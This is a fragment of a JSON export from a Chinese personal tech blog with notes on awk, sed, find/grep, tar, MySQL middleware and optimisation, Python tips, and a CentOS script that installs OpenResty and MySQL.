/etc/passwdrootoperator 12内置变量 ARGC 命令行参数个数ARGV 命令行参数排列ENVIRON 支持队列中系统环境变量的使用FILENAME awk浏览的文件名（输入是文件的时候才会有文件名 如果是搜索别的命令的输出 则不会有文件名）FNR 浏览文件的记录数FS 设置输入域分隔符，等价于命令行 -F选项NF 浏览记录的域的个数（列）NR 已读的记录数（行）OFS 输出域分隔符ORS 输出记录分隔符RS 控制记录分隔符 12变量输出示例 [root@local yang]# awk -F: '{print \"filename:\"FILENAME \" no:\"NR \" cols:\"NF}' /etc/passwdfilename:/etc/passwd no:1 cols:7filename:/etc/passwd no:2 cols:7...... 1使用printf [root@local yang]# awk -F: '{printf(\"filename:%s no:%s cols:%s %s\\n\",FILENAME,NR,NF,$0)}' /etc/passwdfilename:/etc/passwd no:1 cols:7 root:x:0:0:root:/root:/bin/bashfilename:/etc/passwd no:2 cols:7 bin:x:1:1:bin:/bin:/sbin/nologinfilename:/etc/passwd no:3 cols:7 daemon:x:2:2:daemon:/sbin:/sbin/nologinfilename:/etc/passwd no:4 cols:7 adm:x:3:4:adm:/var/adm:/sbin/nologinfilename:/etc/passwd no:5 cols:7 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologinfilename:/etc/passwd no:6 cols:7 sync:x:5:0:sync:/sbin:/bin/syncfilename:/etc/passwd no:7 cols:7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown...... 12变量示例 [root@local yang]# awk -F: '{cnt++;print cnt,$1}END{print\"cnt:\"cnt}' /etc/passwd1 root2 bin3 daemon7 shutdown............35 www36 mysqlcnt:36 1统计文件夹下文件占用字节数(不含子文件夹) [root@local yang]# ll| awk 'BEGIN {size=0}{size=size+$5}END{print\"total size:\"size}'total size:126062 12以M计算 [root@local yang]# ll| awk 'BEGIN {size=0}{size=size+$5}END{print\"total size:\"size/1024/1024\"M\"}'total size:126062 1循环 [root@local node_modules]# awk -F ':' 'BEGIN {count=1;} {name[count] = $1;count++;}; END{for (i = 1; i &lt; NR+1; i++) print i, name[i]}' /etc/passwd1 root2 bin...... 1awk分割大文件并 awk 'NR%12==1{close(p\".txt\");++p}{print > p\".txt\"}' filename","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"linux find grep","slug":"linux/linux find grep","date":"2015-10-31T02:51:01.000Z","updated":"2019-08-26T06:09:54.312Z","comments":true,"path":"2015/10/31/linux/linux find grep/","link":"","permalink":"http://ningmo.github.io/2015/10/31/linux/linux find grep/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546在当前目录下所有文件中查找内容包含 string 的文件:find ./ -name &quot;*&quot; -exec grep &quot;string&quot; &#123;&#125; \\;注意:在最后不能加 print ,否则会出错. 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:find ./ -name &quot;*&quot; -exec grep -l &quot;string&quot; &#123;&#125; \\; 在当前目录下 *.c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):find ./ -name &quot;*.c&quot; -exec grep -n &quot;string&quot; &#123;&#125; \\; 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:find ./ -name &quot;*&quot; -exec grep -n &quot;string&quot; ./ &#123;&#125; \\; 使用 find 查找时希望忽略某个目录(-prune)：如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：find /app -name &quot;/app/bin&quot; -prune -o -print 使用 type 选项：如果要在 /etc 目录下查找所有的目录：find /etc -type d -print 如果要在 /etc 目录下查找 .svn 的目录：find /etc -name .svn -type d -print为了在当前目录下查找除目录以外的所有类型的文件：find . ! -type d -print 为了在当前目录下查找所有的符号链接文件， 可以用：find . -type l -print find . -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）find -name -size +50k -type f/b/c/d/l/sp... -perm -/+ / 755 -uid/user 201/yangsf -gid/group 501/yangsf -nouser/nogroup ===========================================================为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：find . -type f -exec ls -l &#123;&#125; \\; 注： f 表示普通文件 exec 选项后面跟随着所要执行的命令， 然后是一对 &#123;&#125;， 一个空格和一个 \\，最后是一个分号。","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"linux tar","slug":"linux/linux tar","date":"2015-10-31T02:49:30.000Z","updated":"2019-08-26T06:09:54.313Z","comments":true,"path":"2015/10/31/linux/linux tar/","link":"","permalink":"http://ningmo.github.io/2015/10/31/linux/linux tar/","excerpt":"","text":"解压 1234.tar.bz tar zxvf file.tar.gz.tar.gz2 tar jxvf file.tar.bz2.bz gzip -d file.bz.gz2 bzip2 -d file.gz2 压缩 12.gz gzip -v file.bz2 bzip2 -v file 12.tar.gz tar -zcvf file.tar.gz dir.tar.bz2 tar -jcvf file.tar.gz2 dir 查看 12zcatbzcat","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"},{"name":"tar","slug":"linux/tar","permalink":"http://ningmo.github.io/categories/linux/tar/"}],"tags":[]},{"title":"linux sed","slug":"linux/linux sed","date":"2015-10-31T02:46:55.000Z","updated":"2019-08-26T06:09:54.313Z","comments":true,"path":"2015/10/31/linux/linux sed/","link":"","permalink":"http://ningmo.github.io/2015/10/31/linux/linux sed/","excerpt":"","text":"原文引用：http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856901.html 12345678910111213141516[root@www ~]# sed [-nefr] [动作]选项与参数：-n ：使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。-e ：直接在命令列模式上进行 sed 的动作编辑；-f ：直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作；-r ：sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)-i ：直接修改读取的文件内容，而不是输出到终端。动作说明： [n1[,n2]]functionn1, n2 ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 10 到 20 行之间进行的，则『 10,20[动作行为] 』function：a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是 对输出进行行删除 12345[root@local yang]# nl passwd |sed &apos;2,33d&apos;1 root:x:0:0:root:/root:/bin/bash34 yang:x:500:500:yang:/home/yang:/bin/bash35 www:x:501:501::/home/www:/sbin/nologin36 mysql:x:502:502::/home 替换行 12345[root@local yang]# nl passwd |sed &apos;2,5c 1111&apos;1 root:x:0:0:root:/root:/bin/bash11116 www:x:501:501::/home/www:/sbin/nologin7 mysql:x:502:502::/home/m 列出指定行内容 123[root@local yang]# nl passwd |sed -n &apos;2,3p&apos;2 saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin3 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 搜索关键字所在行 12[root@local yang]# nl passwd |sed -n &apos;/root/p&apos; #p 打印 d 删除.....1 root:x:0:0:root:/root:/bin/bash 搜索并执行命令 12[root@local yang]# nl passwd |sed -n &apos;/root/&#123;s/root/aaa/;p;q&#125;&apos; # :q执行一次就退出 1 aaa:x:0:0:root:/root:/bin/bash 搜索与替换 12[yang@local ~]$ ifconfig eth0|grep &apos;inet addr&apos;|sed &apos;s/^.*addr://g&apos; |sed &apos;s/Bcast.*$//g&apos;192.168.50.168 对文件的搜索与替换 123456789101112131415[root@local yang]# nl passwd1 root:x:0:0:root:/root:/bin/bash2 saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/---/login3 postfix:x:89:89::/var/spool/postfix:/---/login[root@local yang]# sed -n &apos;s/---/sbin/g;p&apos; passwd #替换预览root:x:0:0:root:/root:/bin/bashsaslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/loginpostfix:x:89:89::/var/spool/postfix:/sbin/login[root@local yang]# sed -i &apos;s/---/sbin/g&apos; passwd #替换 sed -i &apos;s/---/sbin/g;p&apos; passwd 加p将会将输出追加到文件内容[root@local yang]# nl passwd1 root:x:0:0:root:/root:/bin/bash2 saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/login3 postfix:x:89:89::/var/spool/postfix:/sbin/login","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"mysql 中间件","slug":"mysql/mysql 中间件","date":"2015-10-30T01:36:17.000Z","updated":"2019-08-26T06:09:54.318Z","comments":true,"path":"2015/10/30/mysql/mysql 中间件/","link":"","permalink":"http://ningmo.github.io/2015/10/30/mysql/mysql 中间件/","excerpt":"","text":"360的Atlas 1.读写分离 2.从库负载均衡 3.IP过滤 4.自动分表 5.DBA可平滑上下线DB 6.自动摘除宕机的DB altas 在10000/s的请求量级应该是毫无问题的 https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md &nbsp; kingshard（GO） 读写分离。 跨节点分表。 支持透明的MySQL连接池，不必每次新建连接。 支持客户端IP访问控制。 平滑上线DB或下线DB，前端应用无感知。 支持多个slave，slave之间通过权值进行负载均衡。 支持强制读主库。 支持将sql发送到特定的node。 支持在单个node上执行事务，不支持跨多个node执行事务。 支持跨node的count,sum,max和min等函数。 支持单个分表的join操作，即支持分表和另一张不分表的join操作。 支持order by,limit等操作。 支持主流语言（java,php,python,C/C++,Go)SDK的mysql的prepare特性。 https://github.com/flike/kingshard/blob/master/README_ZH.md &nbsp; 阿里的Cobar（java） https://github.com/alibaba/cobar 淘宝的 TDDL https://github.com/alibaba/tb_tddl 百度的DBProxy Amoeba http://www.biaodianfu.com/amoeba.html mysqlnd_ms 读写分离插件http://www.laruence.com/2011/10/05/2192.html mysql官方的mysql-proxy OneProxy OneSQL","categories":[],"tags":[]},{"title":"ipython notebook","slug":"python/ipython notebook","date":"2015-10-28T12:59:09.000Z","updated":"2019-08-26T06:58:38.344Z","comments":true,"path":"2015/10/28/python/ipython notebook/","link":"","permalink":"http://ningmo.github.io/2015/10/28/python/ipython notebook/","excerpt":"","text":"本内容基于centosyum install sqlite-devel -y #安装python2.7.10谨记–prefix=/usr/local/python27 以及 make altinstall 安装 pip 修改源 vim ~/.pip/pip.conf 123[global]index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 开始 1234567pip install virtualenvvirtualenv notebooksource notebook/bin/activatepip install ipythonpip install pyzmqpip install tornadopip install MathJax ipython notebook如出现 ImportError: No module named notebook.notebookapp 1pip install jupyter 出现 ImportError: No module named _sqlite3 1yum install sqlite-devel -y 如果python已经安装好 需要重新编译python","categories":[{"name":"ipython","slug":"ipython","permalink":"http://ningmo.github.io/categories/ipython/"},{"name":"python","slug":"ipython/python","permalink":"http://ningmo.github.io/categories/ipython/python/"}],"tags":[]},{"title":"性能监控","slug":"linux/性能监控","date":"2015-10-28T03:29:18.000Z","updated":"2019-08-26T08:27:11.473Z","comments":true,"path":"2015/10/28/linux/性能监控/","link":"","permalink":"http://ningmo.github.io/2015/10/28/linux/性能监控/","excerpt":"","text":"确定监控的对象 指标 报警机制 硬件监控：温度 硬盘 系统监控： CPU：上下文切换（context switchs） 运行队列（Run queue） 使用率（utilization）常用工具 top vmstat mpstat 内存：使用率 SWAP使用率 也可以通过内存的使用率曲线发现某些服务的内存溢出 常用工具free vmstat IO：磁盘IO 网络IO 常用工具 iostat iotop iftop TCP监控：查看tcp连接情况 常用工具 netstat ss 其它项：进程数 登录用户及历史记录 openfile 应用监控：各类服务如nginx mysql 等 以上监控集合：Zabbix 流量分析:网络监控安全监控业务监控日志监控:logstash(收集) elasticsearch（存储+搜索） kibana（展示）自动化可视化 以上内容整合自 高效运维（公众号） 如有版权问题请联系本站管理人员予以删除","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"centos 安装mysqldb 记录","slug":"linux/centos 安装mysqldb 记录","date":"2015-10-13T07:41:18.000Z","updated":"2019-08-26T06:09:54.310Z","comments":true,"path":"2015/10/13/linux/centos 安装mysqldb 记录/","link":"","permalink":"http://ningmo.github.io/2015/10/13/linux/centos 安装mysqldb 记录/","excerpt":"","text":"vim setup_pofix.py #修改mysql_config路径 123456ln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/libldconfigpython setup.py install报错“_mysql.c:29:20: 错误：Python.h：没有那个文件或目录”yum install python-devel","categories":[],"tags":[]},{"title":"angularjs-yeoman环境配置","slug":"js/angularjs-yeoman环境配置","date":"2015-10-13T07:27:26.000Z","updated":"2019-08-26T08:23:30.117Z","comments":true,"path":"2015/10/13/js/angularjs-yeoman环境配置/","link":"","permalink":"http://ningmo.github.io/2015/10/13/js/angularjs-yeoman环境配置/","excerpt":"","text":"12345yum install npm -ynpm install -g grunt-cli bower yo generator-karma-require generator-angular-requireyum install ruby ruby-devel rubygems -ygem sources --add https://ruby.taobao.org/ --remove http://rubygems.org/gem install compass","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"}]},{"title":"angularjs 根据变量改变 动态加载模板","slug":"js/angularjs 根据变量改变 动态加载模板","date":"2015-10-12T05:56:46.000Z","updated":"2019-08-26T08:23:14.338Z","comments":true,"path":"2015/10/12/js/angularjs 根据变量改变 动态加载模板/","link":"","permalink":"http://ningmo.github.io/2015/10/12/js/angularjs 根据变量改变 动态加载模板/","excerpt":"","text":"directive 12345678return &#123; restrict: &apos;E&apos;, replace: true, templateUrl: &apos;app/view/order.html&apos;, link: function (scope, element, attrs) &#123; scope.Type = attrs.Type; &#125; &#125;; 模板 12345&lt;div ng-switch on=&quot;item.Type&quot;&gt; &lt;div ng-switch-when=&quot;1&quot;&gt;&lt;ng-include src=&quot;&apos;views/1.html&apos;&quot;&gt;&lt;/ng-include&gt;&lt;/div&gt; &lt;div ng-switch-when=&quot;2&quot;&gt;&lt;ng-include src=&quot;&apos;views/2.html&apos;&quot;&gt;&lt;/ng-include&gt;&lt;/div&gt; &lt;div ng-switch-when=&quot;3&quot;&gt;&lt;ng-include src=&quot;&apos;views/3.html&apos;&quot;&gt;&lt;/ng-include&gt;&lt;/div&gt;&lt;/div&gt;","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"}]},{"title":"oauth2.0原理","slug":"php/oauth2.0原理","date":"2015-09-29T15:08:25.000Z","updated":"2019-08-26T06:09:54.324Z","comments":true,"path":"2015/09/29/php/oauth2.0原理/","link":"","permalink":"http://ningmo.github.io/2015/09/29/php/oauth2.0原理/","excerpt":"","text":"oauth2.0的大致原理 三个角色： 用户（u） 服务商（s） web（c） 跳转至s的登录授权页面（Request User Url） 提示用户登录并显示授权信息 生成oauth code给c（应该是通过callback url返回） 2.C 向S 请求access_token（Request access url ） 3.C通过Access Token向S请求OpenID（Request info url） 4.C用code、token 向S请求用户信息 如图： From： http://kb.cnblogs.com/page/189153/ &nbsp; &nbsp;","categories":[],"tags":[]},{"title":"linux命令 小技巧","slug":"linux/linux命令 小技巧","date":"2015-09-17T14:12:38.000Z","updated":"2019-08-26T06:09:54.314Z","comments":true,"path":"2015/09/17/linux/linux命令 小技巧/","link":"","permalink":"http://ningmo.github.io/2015/09/17/linux/linux命令 小技巧/","excerpt":"","text":"123456!! #执行上条命令!c #显示之前以c开头的命令历史!?abc #显示包含abc的命令历史 vim &#123;1,2,3&#125;.log # 同时编辑多个文件touch &#123;1..10&#125;.txt #创建多个文件","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"centos6.7 install chrome","slug":"linux/centos6.7 install chrome","date":"2015-09-14T06:49:04.000Z","updated":"2019-08-26T06:09:54.311Z","comments":true,"path":"2015/09/14/linux/centos6.7 install chrome/","link":"","permalink":"http://ningmo.github.io/2015/09/14/linux/centos6.7 install chrome/","excerpt":"","text":"1.yum仓库 （如果用rpm包安装 可以忽略此步） 1234567vim /etc/yum.repos.d/google-chrome.repo[google-chrome]name=google-chromebaseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearchenabled=1gpgcheck=1gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub 2.安装依赖(当遇到listdc++依赖时) 12wget http://li.nux.ro/download/nux/dextop/el6/x86_64/nux-dextop-release-0-2.el6.nux.noarch.rpmrpm -ivh nux-dextop-release-0-2.el6.nux.noarch.rpm yum install google-chrome-stable如果遇到网络失败 百度下载google-chrome当rpm包下载完成后 点击安装即可","categories":[],"tags":[]},{"title":"开启nginx缓存","slug":"linux/开启nginx缓存","date":"2015-08-25T15:01:25.000Z","updated":"2019-08-26T06:09:54.315Z","comments":true,"path":"2015/08/25/linux/开启nginx缓存/","link":"","permalink":"http://ningmo.github.io/2015/08/25/linux/开启nginx缓存/","excerpt":"","text":"proxy_cache_path和proxy_cache可以开启基础缓存proxy_cache_path：缓存路径proxy_cache：用来启用缓存","categories":[{"name":"nginx","slug":"nginx","permalink":"http://ningmo.github.io/categories/nginx/"}],"tags":[]},{"title":"python常用","slug":"python/python常用","date":"2015-08-10T13:45:03.000Z","updated":"2019-08-26T06:55:30.450Z","comments":true,"path":"2015/08/10/python/python常用/","link":"","permalink":"http://ningmo.github.io/2015/08/10/python/python常用/","excerpt":"","text":"取得字典的交集 1234&gt;&gt;&gt; a=&#123;&apos;a&apos;:1,&apos;b&apos;:2,&apos;c&apos;:3&#125;&gt;&gt;&gt; b=&#123;&apos;a&apos;:2,&apos;c&apos;:3,&apos;d&apos;:4&#125;&gt;&gt;&gt; dict(a.viewitems(), b.viewitems())&#123;&apos;c&apos;: 3&#125; 获取当前可用变量 1locals() 生成器的应用yield fab(max):12345n,x,y = 0,0,1if n &gt; maxyield yx,y = y,x+yn=n+1 生成器结束时抛出StopIteration 异常 在for中不影响运行fab是生成器函数fab（10）是fab返回的一个生成器生成器可用于读取大文件 导入包的方法1. 12f, filename, description = imp.find_module(&apos;re&apos;)re = imp.load_module(&apos;re&apos;, f, filename, description) 2. 1re = __import__(&apos;re&apos;) 3. 1234filename = &quot;mo.py&quot;f = open(filename )description = (&apos;.py&apos;, &apos;U&apos;, 1)mo = imp.load_module(&apos;some&apos;, f, filename, description)","categories":[],"tags":[]},{"title":"mysql语句优化","slug":"mysql/mysql语句优化","date":"2015-08-10T09:56:06.000Z","updated":"2019-08-26T06:09:54.322Z","comments":true,"path":"2015/08/10/mysql/mysql语句优化/","link":"","permalink":"http://ningmo.github.io/2015/08/10/mysql/mysql语句优化/","excerpt":"","text":"1、请不要在SELECT中使用DISTINCT； #会用到临时表 2、尽可能不要SELECT *，而应该查询需要用到的指定几个字段； 3、不要对两个大表进行联合，无论是内联或外联。对于需要对两个或多个表进行联合查询的情况，可以做两次或多次数据库查询； 4、在WHERE条件中，尽可能对同类型的数据列进行比较； 5、在WHERE条件中，尽量让有索引的数据列在比较表达始中单独出现； 6、在WHERE条件中，根据数据列排除不合条件数据量由多到少的次序排列条件，在不能确定排除数据多少的前提下，一般来说表达式中使用=、!=、&lt;&gt;要优先于&gt;、&lt;、&gt;=、&lt;=，更优先于LIKE； 如果WHERE条件中的值是数字，那么不要使用单引号进行类型转换；如果WHERE条件中使用LIKE模式匹配，不要在模式开头使用通配符%； 7、不要对WHERE条件中的非BINARY属性的CHAR/VARCHAR字段，进行大小写转换； 8、尽可能不要在SELECT中使用GROUP BY，如果确实有必要，请与主管联系确认；来源： http://www.cnblogs.com/siqi/p/3625885.html","categories":[],"tags":[]},{"title":"mysql优化","slug":"mysql/mysql优化","date":"2015-08-10T09:49:21.000Z","updated":"2019-08-26T06:09:54.319Z","comments":true,"path":"2015/08/10/mysql/mysql优化/","link":"","permalink":"http://ningmo.github.io/2015/08/10/mysql/mysql优化/","excerpt":"","text":"优化从几个方面来说：表结构设计适当索引（主键 普通 唯一 全文组合）mysql本身配置硬件配置SQL语句优化 存储过程分表 分区读写分离清理垃圾数据","categories":[],"tags":[]},{"title":"php优化思路","slug":"php/php优化思路","date":"2015-08-10T09:36:29.000Z","updated":"2019-08-26T06:09:54.326Z","comments":true,"path":"2015/08/10/php/php优化思路/","link":"","permalink":"http://ningmo.github.io/2015/08/10/php/php优化思路/","excerpt":"","text":"优化思路： 瓶颈在哪里？ 1 网络 2 CPU 3 共享存储（共享存储主要在通讯进程中发挥作用，或者是用于储存公共资源（比如多个CPU间的缓存数据或代码）。如果共享存储分配不足，同样将导致瓶颈的发生） 4 文件系统（读写） 5 进程管理 6 连接到其它服务器 性能优化：http://www.open-open.com/lib/view/open1370769825070.html","categories":[],"tags":[]},{"title":"find  grep","slug":"linux/find  grep","date":"2015-08-10T09:35:23.000Z","updated":"2019-08-26T06:09:54.311Z","comments":true,"path":"2015/08/10/linux/find  grep/","link":"","permalink":"http://ningmo.github.io/2015/08/10/linux/find  grep/","excerpt":"","text":"————————————-find—grep—————————————-在当前目录下所有文件中查找内容包含 string 的文件:find ./ -name “*” -exec grep “string” {} ;注意:在最后不能加 print ,否则会出错. 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:find ./ -name “*” -exec grep -l “string” {} ; 在当前目录下 .c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):find ./ -name “.c” -exec grep -n “string” {} ; 在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:find ./ -name “*” -exec grep -n “string” ./ {} ; 使用 find 查找时希望忽略某个目录(-prune)：如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：find /app -name “/app/bin” -prune -o -print 使用 type 选项：如果要在 /etc 目录下查找所有的目录：find /etc -type d -print 如果要在 /etc 目录下查找 .svn 的目录：find /etc -name .svn -type d -print 为了在当前目录下查找除目录以外的所有类型的文件：find . ! -type d -print 为了在当前目录下查找所有的符号链接文件， 可以用：find . -type l -print find . -mtime -4（4天内）/4(4天前的那一天)/+4（5天前） find -name -size +50k -type f/b/c/d/l/sp… -perm -/+ / 755 -uid/user 201/yangsf -gid/group 501/yangsf -nouser/nogroup ===========================================================为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：find . -type f -exec ls -l {} ; 注： f 表示普通文件 exec 选项后面跟随着所要执行的命令， 然后是一对 {}， 一个空格和一个 \\，最后是一个分号。","categories":[],"tags":[]},{"title":"awk","slug":"linux/awk","date":"2015-08-10T09:34:43.000Z","updated":"2019-08-26T06:09:54.310Z","comments":true,"path":"2015/08/10/linux/awk/","link":"","permalink":"http://ningmo.github.io/2015/08/10/linux/awk/","excerpt":"","text":"引用：http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273awk [-F &apos;:&apos; ] &apos;&#123;print $1&#125;&apos; filenamecat filename | awk [-F &apos;:&apos; ] &apos;&#123;print $1&#125;&apos;[root@local yang]# tail /etc/passwd |awk -F &apos;:&apos; &apos;BRGIN &#123;print &quot;name,shell&quot;&#125; &#123;print $1&quot;---&quot;$7&#125; END &#123;print &quot;nameEND,shellEND&quot;&#125;&apos;ntp---/sbin/nologinapache---/sbin/nologinsaslauth---/sbin/nologinpostfix---/sbin/nologinpulse---/sbin/nologinnameEND,shellEND搜索并打印所在行[root@local yang]# awk -F: &apos;/root/&apos; /etc/passwd #红色部分为正则root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologin$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,......以此类推搜索并打印所在行（过滤输出）[root@local yang]# awk -F: &apos;/root/&#123;print $1&#125;&apos; /etc/passwdrootoperator内置变量ARGC 命令行参数个数ARGV 命令行参数排列ENVIRON 支持队列中系统环境变量的使用FILENAME awk浏览的文件名（输入是文件的时候才会有文件名 如果是搜索别的命令的输出 则不会有文件名）FNR 浏览文件的记录数FS 设置输入域分隔符，等价于命令行 -F选项NF 浏览记录的域的个数（列）NR 已读的记录数（行）OFS 输出域分隔符ORS 输出记录分隔符RS 控制记录分隔符变量输出示例[root@local yang]# awk -F: &apos;&#123;print &quot;filename:&quot;FILENAME &quot; no:&quot;NR &quot; cols:&quot;NF&#125;&apos; /etc/passwdfilename:/etc/passwd no:1 cols:7filename:/etc/passwd no:2 cols:7......使用printf[root@local yang]# awk -F: &apos;&#123;printf(&quot;filename:%s no:%s cols:%s %s\\n&quot;,FILENAME,NR,NF,$0)&#125;&apos; /etc/passwdfilename:/etc/passwd no:1 cols:7 root:x:0:0:root:/root:/bin/bashfilename:/etc/passwd no:2 cols:7 bin:x:1:1:bin:/bin:/sbin/nologinfilename:/etc/passwd no:3 cols:7 daemon:x:2:2:daemon:/sbin:/sbin/nologinfilename:/etc/passwd no:4 cols:7 adm:x:3:4:adm:/var/adm:/sbin/nologinfilename:/etc/passwd no:5 cols:7 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologinfilename:/etc/passwd no:6 cols:7 sync:x:5:0:sync:/sbin:/bin/syncfilename:/etc/passwd no:7 cols:7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown......awk编程变量示例[root@local yang]# awk -F: &apos;&#123;cnt++;print cnt,$1&#125;END&#123;print&quot;cnt:&quot;cnt&#125;&apos; /etc/passwd1 root2 bin3 daemon7 shutdown............35 www36 mysqlcnt:36统计文件夹下文件占用字节数(不含子文件夹)[root@local yang]# ll| awk &apos;BEGIN &#123;size=0&#125;&#123;size=size+$5&#125;END&#123;print&quot;total size:&quot;size&#125;&apos;total size:126062以M计算[root@local yang]# ll| awk &apos;BEGIN &#123;size=0&#125;&#123;size=size+$5&#125;END&#123;print&quot;total size:&quot;size/1024/1024&quot;M&quot;&#125;&apos;total size:126062循环[root@local node_modules]# awk -F &apos;:&apos; &apos;BEGIN &#123;count=1;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 1; i &amp;lt; NR+1; i++) print i, name[i]&#125;&apos; /etc/passwd1 root2 bin......awk分割大文件并 awk &apos;NR%12==1&#123;close(p&quot;.txt&quot;);++p&#125;&#123;print &gt; p&quot;.txt&quot;&#125;&apos; filename","categories":[],"tags":[]},{"title":"centos6.6 install","slug":"linux/centos6.6 install","date":"2015-08-10T09:31:15.000Z","updated":"2019-08-26T06:09:54.311Z","comments":true,"path":"2015/08/10/linux/centos6.6 install/","link":"","permalink":"http://ningmo.github.io/2015/08/10/linux/centos6.6 install/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/bin/bashrpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmrpm --import http://elrepo.org/RPM-GPG-KEY-elrepo.orgrpm -Uvh http://www.elrepo.org/elrepo-release-6-6.el6.elrepo.noarch.rpm #yum update -yyum install kernel-devel vim gcc cmake -y#openresty(nginx)mkdir /data/src -pcd /data/src/wget http://openresty.org/download/ngx_openresty-1.5.12.1.tar.gztar zxvf ngx_openresty-1.5.12.1.tar.gzcd ngx_openresty-1.5.12.1yum install readline-devel pcre-devel openssl-devel -yyum install gcc gcc-c++ -y./configure --with-luajit -j2make -j2make installgroupadd wwwuseradd www -g www -M -s /sbin/nologinmv /usr/local/openresty/nginx/conf/nginx.conf /usr/local/openresty/nginx/conf/nginx.conf.bakcd /usr/local/openresty/nginx/conf/wget http://1.myconf.sinaapp.com/linux_install/nginx.conf.txt -O /usr/local/openresty/nginx/conf/nginx.confwget http://1.myconf.sinaapp.com/linux_install/fastcgi_parms.txt -O /usr/local/openresty/nginx/conf/fastcgi_paramsmkdir vhostscd vhostswget http://1.myconf.sinaapp.com/linux_install/default.conf.txt -O /usr/local/openresty/nginx/conf/vhosts/default.confwget http://1.myconf.sinaapp.com/linux_install/nginX.txt -O /etc/init.d/nginxchmod u+x /etc/init.d/nginx#mysql cd /data/srcwget http://1.myconf.sinaapp.com/linux_install/mysql-5.5.37.tar.gztar zxvf mysql-5.5.37.tar.gzcd mysql-5.5.37cmake -DCMAKE_BUILD_TYPE:STRING=Release -DMYSQL_USER=mysql -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/data/mysql -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/data/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DWITH_SSL=yes -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_cimake &amp;amp;&amp;amp; make installmv /etc/my.cnf /etc/my.cnf.bakcp support-files/my-medium.cnf /etc/my.cnfwget http://1.myconf.sinaapp.com/linux_install/my.cnf.txt -O /etc/my.cnfcp support-files/mysql.server 